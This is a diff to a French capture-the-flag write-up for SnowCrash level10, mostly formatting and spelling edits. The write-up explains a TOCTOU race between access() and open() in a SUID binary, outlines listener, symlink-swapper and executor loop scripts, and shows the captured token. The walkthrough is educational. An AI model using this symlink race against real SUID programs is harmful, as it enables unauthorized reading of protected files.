@@ -14,30 +14,31 @@ d--x--x--x  1 root    users     340 Aug 30  2015 ..
 -rw-------  1 flag10  flag10     26 Mar  5  2016 token
 ```
 
-En tentant d'exécuter `level10` on a l'exemple d'input a transmetre à l'exécutable `file host`:
-``` bash
+En tentant d'exécuter `level10` on a l'exemple d'input à transmetre à l'exécutable `file host`:
+
+```
 level10@SnowCrash:~$ ./level10
 ./level10 file host
 	sends file to host if you have access to it
 ```
 
-On essaie de transmettre 0 localhost (128.0.0.1) le fichier token sur lequel nous n'avons aucun droit, la fonction access() va retourner -1 et le programme va s'arreter:
+On essaie de transmettre 0 localhost (128.0.0.1) le fichier `token` sur lequel nous n'avons aucun droit, la fonction `access()` va retourner -1 et le programme va s'arrêter:
 
-``` bash
+```Diff
 level10@SnowCrash:~$ ltrace ./level10 token 127.0.0.1
 __libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
-access("token", 4)                                                       = -1
-printf("You don't have access to %s\n", "token"You don't have access to token
-)                         = 31
++access("token", 4)                                                             = -1
++printf("You don't have access to %s\n", "token"You don't have access to token) = 31
 +++ exited (status 31) +++
 ```
+
 En effet malgré que le bit SUID soit activé pour `level10` la fonction `access()` renvoit -1.
 Quand un processus est lancé avec le SUID le système lui attribue deux identités:
-- RUID (Real User ID): identité réelle de l'utilisateur.
-- EUID (Effective User ID): identité que l'utilisateur emprunte pour l'exécution du programme.
+- `RUID (Real User ID)`: identité réelle de l'utilisateur.
+- `EUID (Effective User ID)`: identité que l'utilisateur emprunte pour l'exécution du programme.
 La fonction `access()` vérifie le RUID et non l'EUID, il ignore ainsi le pouvoir du SUID.
 
-En utilisant cette fois ltrace avec un fichier sur lequel nous avons les droits on comprend qu'il va faloir écouter une connection provenant du port 6969 sur localhost.
+En utilisant cette fois ltrace avec un fichier sur lequel nous avons les droits on comprend qu'il va faloir écouter une connection provenant du port `6969` sur localhost.
 
 ``` bash
 level10@SnowCrash:~$ echo "coucou" > /tmp/test
@@ -56,11 +57,12 @@ exit(1 <unfinished ...>
 +++ exited (status 1) +++
 ```
 
-Nous ouvrons donc un autre terminal pour utiliser `nc` avec le flag `-l` qui comme le dit le man "[is] Used to specify that nc should listen for an incoming connection rather than initiate a connection to a remote host."
+Nous ouvrons donc un autre terminal pour utiliser `nc` avec le flag `-l` qui comme le dit le man `[is] Used to specify that nc should listen for an incoming connection rather than initiate a connection to a remote host.`
 
 L'écoute sur le port 6969 indique que le programme restitue le contenu du fichier donné en paramètre au processus qui écoute sur le port 6969 avec `open()`, `read()`, `write()`.
 
 Premier terminal pour lancer le programme:
+
 ``` bash
 level10@SnowCrash:~$ ltrace ./level10 /tmp/test 127.0.0.1
 __libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
@@ -84,6 +86,7 @@ puts("wrote file!"wrote file!
 ```
 
 Deuxième terminal pour lancer l'écoute sur le port 6969:
+
 ``` bash
 level10@SnowCrash:~$ nc -l 6969
 .*( )*.
@@ -91,19 +94,23 @@ coucou
 ```
 
 L'utilisation de `ltrace()` nous permet de voir le recours à la fonction `open()`.
+
 Cette fonction, à la différence de `access()`, ouvre le fichier avec les droits actuels du processus (EUID).
-Ici nous faisons face à une faille de type Time-of-check to time-of-use (TOCTOU).
+
+Ici nous faisons face à une faille de type `Time-of-check to time-of-use (TOCTOU)`.
+
 Nous allons trouver un moyen d'exploiter le délai entre la vérification du RUID avec `access()` et l'ouverture du fichier avec `open()`.
 
 Pour cela nous allons lancer trois scripts différents qui vont lancer plusieurs boucles.
 
-Un premier qui permettra de lancer la commande nc en boucle et recevoir les données envoyée sur le port 6969 par le programme level10.
+Un premier qui permettra de lancer la commande `nc` en boucle et recevoir les données envoyée sur le port 6969 par le programme `level10`.
 
-Un second qui a pour but de créer un fichier sur lequel nous avons les droits puis dans une boucle, de créer un lien qui pointe vers lui puis de le remplacer par un lien du meme nom qui pointe vers token.
+Un second qui a pour but de créer un fichier sur lequel nous avons les droits puis dans une boucle, de créer un lien qui pointe vers lui puis de le remplacer par un lien du même nom qui pointe vers token.
 
-Un troisième pour lancer en boucle l'exécution du fichier level10.
+Un troisième pour lancer en boucle l'exécution du fichier `level10`.
 
-Recepteur:
+Récepteur:
+
 ``` bash
 #!/bin/bash
 
@@ -115,6 +122,7 @@ done
 ```
 
 Swapper:
+
 ``` bash
 #!/bin/bash
 
@@ -131,6 +139,7 @@ done
 ```
 
 Executeur:
+
 ``` bash
 #!/bin/bash
 
@@ -139,7 +148,7 @@ while true; do
 done
 ```
 
-Nous lancons les scripts swapper et executeur en arrière plan en redirigeant elur sortie afin de pouvoir voir le reultat du script recepteur.
+Nous lancons les scripts swapper et executeur en arrière plan en redirigeant leur sortie afin de pouvoir voir le résultat du script récepteur.
 
 
 ``` bash
@@ -185,11 +194,11 @@ Check flag.Here is your token : feulo4b72j7edeahuete3no7c
 
 
 Commandes utiles:
-    - jobs : affiche la liste des scripts qui tournent en arrière plan
-    - fg %1 : ramène le jon 1 au premier plan
-    - kill %1 : tue le job 1 proprement
-    - ps aux | grep bash : pour identifier les PID
-    - kill -9 
+    - `jobs` : affiche la liste des scripts qui tournent en arrière plan
+    - `fg %1` : ramène le jon 1 au premier plan
+    - `kill %1` : tue le job 1 proprement
+    - `ps aux | grep bash` : pour identifier les PID
+    - `kill -9` 
 
 Source:
     - https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
